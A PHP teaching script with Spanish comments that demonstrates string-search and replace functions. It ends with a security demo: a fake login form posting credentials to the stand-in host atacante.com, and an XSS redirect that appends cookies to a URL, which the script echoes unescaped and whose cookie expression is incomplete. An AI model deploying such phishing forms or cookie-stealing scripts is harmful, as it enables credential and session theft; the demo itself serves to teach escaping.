<?php
// Busqueda de patrones
$cadena = "abcdefg";
$encontrar = "abc";

if (strpos($cadena,$encontrar) !== false)
	echo "Se encontro la cadena<br>";
var_dump (strpos($cadena,$encontrar));
echo "<br>";

////////////////////////////////////////////

unset($cadena);
$cadena="abcdef12345abcde";

echo strpos($cadena,$encontrar)."<br>";
echo strpos($cadena,$encontrar,1)."<br>";


////////////////////////////////////////////

echo strstr($cadena,"34")."<br>";

////////////////////////////////////////////

$cadena2="AbCdEf12345aBcDe";

echo stripos($cadena2,"ABC")."<br>";

echo stristr($cadena2,"DEF1")."<br>";

echo strrpos($cadena2,'ABC')."<br>";


////////////////////////////////////////////

echo str_replace("STRING", "cadena", "Reemplazo de STRING").'<br>';

echo str_ireplace("StRiNg", "cadena", "Reemplazo de string sin caso sensible.").'<br>';
////////
$seguridad = <<<INICIO
		<form action="http://atacante.com/captura.php" method="post">
		usuario: <input type="text" name="usuario" />
		<br /> Contrase&ntilde;a <input type="text" name="pass" />
		<input type="submit" value="Enviar" />
		</form>
INICIO;
//echo $seguridad;
///////

$seguridad2 =<<<INICIO
		<script>location.href='http://localhost/PHPZEND/prueba.php?cookies='+document.</script>
INICIO;

echo $seguridad2;
$seguridad = str_replace ("<",'&lt;',$seguridad);
$seguridad = str_replace (">",'&gt;',$seguridad);
//echo $seguridad;
?>